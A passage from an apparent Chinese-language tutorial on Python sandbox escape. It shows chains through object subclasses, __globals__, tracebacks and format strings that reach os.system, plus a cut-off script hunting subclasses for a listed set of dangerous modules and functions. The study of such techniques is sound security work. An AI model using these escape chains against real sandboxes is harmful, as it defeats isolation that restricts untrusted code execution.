<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">[].__class__.__mro__[1]</span><br><span class="line">().__class__.__mro__[1]</span><br><span class="line">&#123;&#125;.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line"># Python3</span><br><span class="line">&#x27;&#x27;.__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[1]</span><br><span class="line"></span><br><span class="line"># Python2</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br></pre></td></tr></table></figure></div>

<p>然后我们就可以看它的子类：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in enumerate(&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()): print i</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720161651311.png"
                      alt="image-20230720161651311"
                ></p>
<p>我们可以看到site也在里面</p>
<p>我们上边分析了可以通过site调用os模块</p>
<p>那我们这里就可以构造逃逸链获取到os模块</p>
<p>这里只有site的方法，那我们可以使用<code>__globals__</code>获取全局变量从而获得os</p>
<p>我们这里使用site._Printer为例来获得os</p>
<p>我们可以通过其全局变量<code>__globals__</code>获取os模块</p>
<p><code>__globals__</code></p>
<p>是函数所在的全局命名空间中所定义的全局变量。也就是只要是函数就会有这个属性。除了 <code>builtin_function_or_method</code> 或者是 <code>wrapper_descriptor</code> 、<code>method-wrapper</code> 类型的函数，例如 <code>range</code>、<code>range.__init__</code>、<code>&#39;&#39;.split</code> 等等</p>
<p>那我们这里可以先看一下里面有哪些函数或者方法：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import site</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">printer_members = dir(site._Printer)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for member in printer_members:</span><br><span class="line">    print(member)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>我们可以通过内置函数或者这些存在site._Printer里面的函数调用<code>__globals__</code>属性获得os</p>
<p>那我们这里就可以构造逃逸链获得os：（python2中可用，py3.x 中已经移除了这里 <code>__globals__</code>）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[72].__init__.__globals__[&#x27;os&#x27;].system(&#x27;dir&#x27;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[72]._Printer__setup.__call__(eval, &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[72]._Printer__setup.__globals__[&#x27;os&#x27;]</span><br><span class="line">避免依赖于索引位置的方式来获取 _Printer 类，而是通过检查类的名称来获得对应的子类</span><br><span class="line">[i._Printer__setup.__globals__[&#x27;os&#x27;] for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_Printer&quot;]</span><br></pre></td></tr></table></figure></div>

<p>那么通过这种逃逸链我们就可以得到os模块</p>
<p>当然不只是这一种：</p>
<p><strong>warnings</strong>（python2）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import warnings</span><br><span class="line">warnings.linecache.os</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720172906065.png"
                      alt="image-20230720172906065"
                ></p>
<p>我们可用通过多重寻找的方法获取os</p>
<p>同样的我们的继承链构造为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&#x27;linecache&#x27;].__dict__[&#x27;os&#x27;].system(&#x27;whoami&#x27;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>除了linecache，warnings里面还有一一个函数<code>warnings.catch_warnings</code>里面有_module属性</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720173705814.png"
                      alt="image-20230720173705814"
                ></p>
<p>构造逃逸链POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == &#x27;catch_warnings&#x27;][0]()._module.linecache.os.system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720174914294.png"
                      alt="image-20230720174914294"
                ></p>
<p>但是上面说的都是在python2中才能使用，python 3<code>warnings</code>中的<code>linecache</code>被删除了</p>
<p>所有我们无法使用上面的方法</p>
<p>但是在python3中有<code>__builtins__</code></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230720180216542.png"
                      alt="image-20230720180216542"
                ></p>
<p>而且还存在一个os._wrap_close</p>
<p>那么我们就可用构造逃逸链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__[-1].__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br><span class="line">或者:</span><br><span class="line">[i for i in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() if i.__name__ == &quot;_wrap_close&quot;][0].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br><span class="line">或</span><br><span class="line">set.mro()[-1].__subclasses__()[133].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br><span class="line">或者直接使用object</span><br><span class="line">object.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>



<h3 id="object子类导入危险方法"><a href="#object子类导入危险方法" class="headerlink" title="object子类导入危险方法"></a>object子类导入危险方法</h3><p>如果object的的子类导入了危险方法，那我们就可以调用子类的危险方法</p>
<p>例如object的子类builtin_function_or_method中导入了<code>__call__</code>方法</p>
<p>构造逃逸链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python3</span><br><span class="line">object.__subclasses__()[7].__call__(eval, &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">python2</span><br><span class="line">object.__subclasses__()[29].__call__(eval, &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="利用异常逃逸"><a href="#利用异常逃逸" class="headerlink" title="利用异常逃逸"></a>利用异常逃逸</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hack = lambda : [0][1]</span><br><span class="line">try:</span><br><span class="line">    hack()</span><br><span class="line">except Exception as e:</span><br><span class="line">    e.__traceback__.tb_next.tb_frame.f_globals[&#x27;__builtins__&#x27;][&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure></div>

<p>这一部分参考文章上面是写了，但是我本地并没有复现成功</p>
<h3 id="利用format"><a href="#利用format" class="headerlink" title="利用format"></a><strong>利用format</strong></h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;0.__class__.__base__&#125;&quot;.format([])</span><br><span class="line">&quot;&#123;x.__class__.__base__&#125;&quot;.format(x=[])</span><br><span class="line">&quot;&#123;.__class__.__base__&#125;&quot;.format([])</span><br><span class="line">(&quot;&#123;0.__class_&quot;+&quot;_.__base__&#125;&quot;).format([])</span><br></pre></td></tr></table></figure></div>

<p>分析：</p>
<ol>
<li><p><code>&quot;&#123;0.__class__.__base__&#125;&quot;.format([])</code>: 这个代码将一个空列表 <code>[]</code> 作为参数传递给 <code>format</code> 方法，然后使用 <code>&#123;&#125;</code> 来进行字符串格式化。在这里，<code>0</code> 表示参数列表的第一个元素，也就是空列表 <code>[]</code>。<code>__class__</code> 是获取对象的类，而 <code>__base__</code> 则是获取类的基类。因此，这个代码的结果是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
<li><p><code>&quot;&#123;x.__class__.__base__&#125;&quot;.format(x=[])</code>: 这个代码与第一个类似，只是使用了命名参数 <code>x</code> 来表示传递的空列表 <code>[]</code>。在这里，<code>x</code> 对应传递的参数，即空列表 <code>[]</code>。因此，这个代码的结果同样是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
<li><p><code>&quot;&#123;.__class__.__base__&#125;&quot;.format([])</code>: 这个代码中使用了 <code>.</code> 来表示格式化的位置，表示传递的参数在格式化字符串之外。在这里，空列表 <code>[]</code> 是作为参数传递给 <code>format</code> 方法，而 <code>.</code> 则表示使用该参数进行格式化。因此，这个代码的结果同样是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
<li><p><code>(&quot;&#123;0.__class_&quot;+&quot;_.__base__&#125;&quot;).format([])</code>: 这个代码的逻辑与第一个相同，只是字符串拼接使用了字符串连接符 <code>_</code>。由于在 <code>&#123;&#125;</code> 内不能直接使用 <code>_</code>，所以需要分开写。结果同样是输出 <code>list</code> 类的基类，也就是 <code>object</code>。</p>
</li>
</ol>
<h3 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h3><p>在参考文章上面，有一个很好的总结，这里借用一下：</p>
<p>以下是构造逃逸链的思路：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">思路一：如果object的某个派生类中存在危险方法，就可以直接拿来用</span><br><span class="line"></span><br><span class="line">思路二：如果object的某个派生类导入了危险模块，就可以链式调用危险方法</span><br><span class="line"></span><br><span class="line">思路三：如果object的某个派生类由于导入了某些标准库模块，从而间接导入了危险模块的危险方法，也可以通过链式调用</span><br><span class="line"></span><br><span class="line">思路四：基本类型的某些方法属于特殊方法，可以通过链式调用</span><br></pre></td></tr></table></figure></div>

<p>然后文章上面也给出了获得poc的代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"># https://github.com/python/cpython/tree/2.7/Lib</span><br><span class="line"># ls -l /usr/lib/python2.7 | awk &#x27;&#123;print$9&#125;&#x27; | grep -v &#x27;.pyc\|this\|antigravity&#x27;</span><br><span class="line"></span><br><span class="line"># Python2标准库模块</span><br><span class="line">modules2 = [&#x27;_abcoll&#x27;, &#x27;abc&#x27;, &#x27;aifc&#x27;, &#x27;anydbm&#x27;, &#x27;argparse.egg-info&#x27;, &#x27;argparse&#x27;, &#x27;ast&#x27;, &#x27;asynchat&#x27;, &#x27;asyncore&#x27;, &#x27;atexit&#x27;, &#x27;audiodev&#x27;, &#x27;base64&#x27;, &#x27;BaseHTTPServer&#x27;, &#x27;Bastion&#x27;, &#x27;bdb&#x27;, &#x27;binhex&#x27;, &#x27;bisect&#x27;, &#x27;bsddb&#x27;, &#x27;calendar&#x27;, &#x27;CGIHTTPServer&#x27;, &#x27;cgi&#x27;, &#x27;cgitb&#x27;, &#x27;chunk&#x27;, &#x27;cmd&#x27;, &#x27;codecs&#x27;, &#x27;codeop&#x27;, &#x27;code&#x27;, &#x27;collections&#x27;, &#x27;colorsys&#x27;, &#x27;commands&#x27;, &#x27;compileall&#x27;, &#x27;compiler&#x27;, &#x27;ConfigParser&#x27;, &#x27;config-x86_64-linux-gnu&#x27;, &#x27;contextlib&#x27;, &#x27;cookielib&#x27;, &#x27;Cookie&#x27;, &#x27;copy&#x27;, &#x27;copy_reg&#x27;, &#x27;cProfile&#x27;, &#x27;csv&#x27;, &#x27;ctypes&#x27;, &#x27;curses&#x27;, &#x27;dbhash&#x27;, &#x27;decimal&#x27;, &#x27;difflib&#x27;, &#x27;dircache&#x27;, &#x27;dis&#x27;, &#x27;dist-packages&#x27;, &#x27;distutils&#x27;, &#x27;doctest&#x27;, &#x27;DocXMLRPCServer&#x27;, &#x27;dumbdbm&#x27;, &#x27;dummy_threading&#x27;, &#x27;dummy_thread&#x27;, &#x27;email&#x27;, &#x27;encodings&#x27;, &#x27;ensurepip&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;fnmatch&#x27;, &#x27;formatter&#x27;, &#x27;fpformat&#x27;, &#x27;fractions&#x27;, &#x27;ftplib&#x27;, &#x27;functools&#x27;, &#x27;__future__&#x27;, &#x27;genericpath&#x27;, &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;glob&#x27;, &#x27;gzip&#x27;, &#x27;hashlib&#x27;, &#x27;heapq&#x27;, &#x27;hmac&#x27;, &#x27;hotshot&#x27;, &#x27;htmlentitydefs&#x27;, &#x27;htmllib&#x27;, &#x27;HTMLParser&#x27;, &#x27;httplib&#x27;, &#x27;ihooks&#x27;, &#x27;imaplib&#x27;, &#x27;imghdr&#x27;, &#x27;importlib&#x27;, &#x27;imputil&#x27;, &#x27;inspect&#x27;, &#x27;io&#x27;, &#x27;json&#x27;, &#x27;keyword&#x27;, &#x27;lib2to3&#x27;, &#x27;lib-dynload&#x27;, &#x27;lib-tk&#x27;, &#x27;LICENSE.txt&#x27;, &#x27;linecache&#x27;, &#x27;locale&#x27;, &#x27;logging&#x27;, &#x27;_LWPCookieJar&#x27;, &#x27;macpath&#x27;, &#x27;macurl2path&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;markupbase&#x27;, &#x27;md5&#x27;, &#x27;mhlib&#x27;, &#x27;mimetools&#x27;, &#x27;mimetypes&#x27;, &#x27;MimeWriter&#x27;, &#x27;mimify&#x27;, &#x27;modulefinder&#x27;, &#x27;_MozillaCookieJar&#x27;, &#x27;multifile&#x27;, &#x27;multiprocessing&#x27;, &#x27;mutex&#x27;, &#x27;netrc&#x27;, &#x27;new&#x27;, &#x27;nntplib&#x27;, &#x27;ntpath&#x27;, &#x27;nturl2path&#x27;, &#x27;numbers&#x27;, &#x27;opcode&#x27;, &#x27;optparse&#x27;, &#x27;os2emxpath&#x27;, &#x27;os&#x27;, &#x27;_osx_support&#x27;, &#x27;pdb.doc&#x27;, &#x27;pdb&#x27;, &#x27;__phello__.foo&#x27;, &#x27;pickle&#x27;, &#x27;pickletools&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;plat-x86_64-linux-gnu&#x27;, &#x27;plistlib&#x27;, &#x27;popen2&#x27;, &#x27;poplib&#x27;, &#x27;posixfile&#x27;, &#x27;posixpath&#x27;, &#x27;pprint&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;pyclbr&#x27;, &#x27;py_compile&#x27;, &#x27;pydoc_data&#x27;, &#x27;pydoc&#x27;, &#x27;_pyio&#x27;, &#x27;Queue&#x27;, &#x27;quopri&#x27;, &#x27;random&#x27;, &#x27;repr&#x27;, &#x27;re&#x27;, &#x27;rexec&#x27;, &#x27;rfc822&#x27;, &#x27;rlcompleter&#x27;, &#x27;robotparser&#x27;, &#x27;runpy&#x27;, &#x27;sched&#x27;, &#x27;sets&#x27;, &#x27;sgmllib&#x27;, &#x27;sha&#x27;, &#x27;shelve&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;SimpleHTTPServer&#x27;, &#x27;SimpleXMLRPCServer&#x27;, &#x27;sitecustomize&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;smtplib&#x27;, &#x27;sndhdr&#x27;, &#x27;socket&#x27;, &#x27;SocketServer&#x27;, &#x27;sqlite3&#x27;, &#x27;sre_compile&#x27;, &#x27;sre_constants&#x27;, &#x27;sre_parse&#x27;, &#x27;sre&#x27;, &#x27;ssl&#x27;, &#x27;stat&#x27;, &#x27;statvfs&#x27;, &#x27;StringIO&#x27;, &#x27;stringold&#x27;, &#x27;stringprep&#x27;, &#x27;string&#x27;, &#x27;_strptime&#x27;, &#x27;struct&#x27;, &#x27;subprocess&#x27;, &#x27;sunaudio&#x27;, &#x27;sunau&#x27;, &#x27;symbol&#x27;, &#x27;symtable&#x27;, &#x27;_sysconfigdata&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;, &#x27;tempfile&#x27;, &#x27;test&#x27;, &#x27;textwrap&#x27;, &#x27;_threading_local&#x27;, &#x27;threading&#x27;, &#x27;timeit&#x27;, &#x27;toaiff&#x27;, &#x27;tokenize&#x27;, &#x27;token&#x27;, &#x27;traceback&#x27;, &#x27;trace&#x27;, &#x27;tty&#x27;, &#x27;types&#x27;, &#x27;unittest&#x27;, &#x27;urllib2&#x27;, &#x27;urllib&#x27;, &#x27;urlparse&#x27;, &#x27;UserDict&#x27;, &#x27;UserList&#x27;, &#x27;user&#x27;, &#x27;UserString&#x27;, &#x27;uuid&#x27;, &#x27;uu&#x27;, &#x27;warnings&#x27;, &#x27;wave&#x27;, &#x27;weakref&#x27;, &#x27;_weakrefset&#x27;, &#x27;webbrowser&#x27;, &#x27;whichdb&#x27;, &#x27;wsgiref&#x27;, &#x27;wsgiref.egg-info&#x27;, &#x27;xdrlib&#x27;, &#x27;xml&#x27;, &#x27;xmllib&#x27;, &#x27;xmlrpclib&#x27;, &#x27;zipfile&#x27;]</span><br><span class="line"></span><br><span class="line"># Python3标准库模块</span><br><span class="line">modules3 = [&#x27;abc&#x27;, &#x27;aifc&#x27;, &#x27;argparse&#x27;, &#x27;ast&#x27;, &#x27;asynchat&#x27;, &#x27;asyncio&#x27;, &#x27;asyncore&#x27;, &#x27;base64&#x27;, &#x27;bdb&#x27;, &#x27;binhex&#x27;, &#x27;bisect&#x27;, &#x27;_bootlocale&#x27;, &#x27;bz2&#x27;, &#x27;calendar&#x27;, &#x27;cgi&#x27;, &#x27;cgitb&#x27;, &#x27;chunk&#x27;, &#x27;cmd&#x27;, &#x27;codecs&#x27;, &#x27;codeop&#x27;, &#x27;code&#x27;, &#x27;collections&#x27;, &#x27;_collections_abc&#x27;, &#x27;colorsys&#x27;, &#x27;_compat_pickle&#x27;, &#x27;compileall&#x27;, &#x27;_compression&#x27;, &#x27;concurrent&#x27;, &#x27;config-3.8-x86_64-linux-gnu&#x27;, &#x27;configparser&#x27;, &#x27;contextlib&#x27;, &#x27;contextvars&#x27;, &#x27;copy&#x27;, &#x27;copyreg&#x27;, &#x27;cProfile&#x27;, &#x27;crypt&#x27;, &#x27;csv&#x27;, &#x27;ctypes&#x27;, &#x27;curses&#x27;, &#x27;dataclasses&#x27;, &#x27;datetime&#x27;, &#x27;dbm&#x27;, &#x27;decimal&#x27;, &#x27;difflib&#x27;, &#x27;dis&#x27;, &#x27;dist-packages&#x27;, &#x27;distutils&#x27;, &#x27;doctest&#x27;, &#x27;dummy_threading&#x27;, &#x27;_dummy_thread&#x27;, &#x27;email&#x27;, &#x27;encodings&#x27;, &#x27;ensurepip&#x27;, &#x27;enum&#x27;, &#x27;filecmp&#x27;, &#x27;fileinput&#x27;, &#x27;fnmatch&#x27;, &#x27;formatter&#x27;, &#x27;fractions&#x27;, &#x27;ftplib&#x27;, &#x27;functools&#x27;, &#x27;__future__&#x27;, &#x27;genericpath&#x27;, &#x27;getopt&#x27;, &#x27;getpass&#x27;, &#x27;gettext&#x27;, &#x27;glob&#x27;, &#x27;gzip&#x27;, &#x27;hashlib&#x27;, &#x27;heapq&#x27;, &#x27;hmac&#x27;, &#x27;html&#x27;, &#x27;http&#x27;, &#x27;imaplib&#x27;, &#x27;imghdr&#x27;, &#x27;importlib&#x27;, &#x27;imp&#x27;, &#x27;inspect&#x27;, &#x27;io&#x27;, &#x27;ipaddress&#x27;, &#x27;json&#x27;, &#x27;keyword&#x27;, &#x27;lib2to3&#x27;, &#x27;lib-dynload&#x27;, &#x27;LICENSE.txt&#x27;, &#x27;linecache&#x27;, &#x27;locale&#x27;, &#x27;logging&#x27;, &#x27;lzma&#x27;, &#x27;mailbox&#x27;, &#x27;mailcap&#x27;, &#x27;_markupbase&#x27;, &#x27;mimetypes&#x27;, &#x27;modulefinder&#x27;, &#x27;multiprocessing&#x27;, &#x27;netrc&#x27;, &#x27;nntplib&#x27;, &#x27;ntpath&#x27;, &#x27;nturl2path&#x27;, &#x27;numbers&#x27;, &#x27;opcode&#x27;, &#x27;operator&#x27;, &#x27;optparse&#x27;, &#x27;os&#x27;, &#x27;_osx_support&#x27;, &#x27;pathlib&#x27;, &#x27;pdb&#x27;, &#x27;__phello__.foo&#x27;, &#x27;pickle&#x27;, &#x27;pickletools&#x27;, &#x27;pipes&#x27;, &#x27;pkgutil&#x27;, &#x27;platform&#x27;, &#x27;plistlib&#x27;, &#x27;poplib&#x27;, &#x27;posixpath&#x27;, &#x27;pprint&#x27;, &#x27;profile&#x27;, &#x27;pstats&#x27;, &#x27;pty&#x27;, &#x27;_py_abc&#x27;, &#x27;pyclbr&#x27;, &#x27;py_compile&#x27;, &#x27;_pydecimal&#x27;, &#x27;pydoc_data&#x27;, &#x27;pydoc&#x27;, &#x27;_pyio&#x27;, &#x27;queue&#x27;, &#x27;quopri&#x27;, &#x27;random&#x27;, &#x27;reprlib&#x27;, &#x27;re&#x27;, &#x27;rlcompleter&#x27;, &#x27;runpy&#x27;, &#x27;sched&#x27;, &#x27;secrets&#x27;, &#x27;selectors&#x27;, &#x27;shelve&#x27;, &#x27;shlex&#x27;, &#x27;shutil&#x27;, &#x27;signal&#x27;, &#x27;_sitebuiltins&#x27;, &#x27;sitecustomize&#x27;, &#x27;site&#x27;, &#x27;smtpd&#x27;, &#x27;smtplib&#x27;, &#x27;sndhdr&#x27;, &#x27;socket&#x27;, &#x27;socketserver&#x27;, &#x27;sqlite3&#x27;, &#x27;sre_compile&#x27;, &#x27;sre_constants&#x27;, &#x27;sre_parse&#x27;, &#x27;ssl&#x27;, &#x27;statistics&#x27;, &#x27;stat&#x27;, &#x27;stringprep&#x27;, &#x27;string&#x27;, &#x27;_strptime&#x27;, &#x27;struct&#x27;, &#x27;subprocess&#x27;, &#x27;sunau&#x27;, &#x27;symbol&#x27;, &#x27;symtable&#x27;, &#x27;_sysconfigdata__linux_x86_64-linux-gnu&#x27;, &#x27;_sysconfigdata__x86_64-linux-gnu&#x27;, &#x27;sysconfig&#x27;, &#x27;tabnanny&#x27;, &#x27;tarfile&#x27;, &#x27;telnetlib&#x27;, &#x27;tempfile&#x27;, &#x27;test&#x27;, &#x27;textwrap&#x27;, &#x27;_threading_local&#x27;, &#x27;threading&#x27;, &#x27;timeit&#x27;, &#x27;tkinter&#x27;, &#x27;tokenize&#x27;, &#x27;token&#x27;, &#x27;traceback&#x27;, &#x27;tracemalloc&#x27;, &#x27;trace&#x27;, &#x27;tty&#x27;, &#x27;turtle&#x27;, &#x27;types&#x27;, &#x27;typing&#x27;, &#x27;unittest&#x27;, &#x27;urllib&#x27;, &#x27;uuid&#x27;, &#x27;uu&#x27;, &#x27;venv&#x27;, &#x27;warnings&#x27;, &#x27;wave&#x27;, &#x27;weakref&#x27;, &#x27;_weakrefset&#x27;, &#x27;webbrowser&#x27;, &#x27;wsgiref&#x27;, &#x27;xdrlib&#x27;, &#x27;xml&#x27;, &#x27;xmlrpc&#x27;, &#x27;zipapp&#x27;, &#x27;zipfile&#x27;, &#x27;zipimport&#x27;]</span><br><span class="line"></span><br><span class="line"># 危险模块</span><br><span class="line">methods = [&#x27;sys&#x27;, &#x27;os&#x27;, &#x27;system&#x27;, &#x27;popen&#x27;, &#x27;subprocess&#x27;, &#x27;platform&#x27;, &#x27;commands&#x27;, &#x27;timeit&#x27;, &#x27;bdb&#x27;, &#x27;cgi&#x27;, &#x27;importlib&#x27;, &#x27;pickle&#x27;, &#x27;pty&#x27;, &#x27;__builtins__&#x27;, &#x27;__import__&#x27;, &#x27;import_module&#x27;, &#x27;eval&#x27;, &#x27;exec&#x27;, &#x27;spawn&#x27;, &#x27;file&#x27;, &#x27;linecache&#x27;, &#x27;types&#x27;]</span><br><span class="line"></span><br><span class="line"># 基本类型</span><br><span class="line">types = [&#x27;&#x27;, [], (), &#123;&#125;]</span><br><span class="line"></span><br><span class="line"># object的派生类</span><br><span class="line">subclasses = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 危险标准库模块</span><br><span class="line">risk_modules = &#123;&#125;</span><br><span class="line"></span><br><span class="line"># 遍历派生类并获取模块</span><br><span class="line">for i in range(0, len(object.__subclasses__())):</span><br><span class="line">    try:</span><br><span class="line">        subclasses[i] = object.__subclasses__()[i].__init__.__globals__.keys()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        # print(e)</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">print(&#x27;------------------------------ object导入危险模块 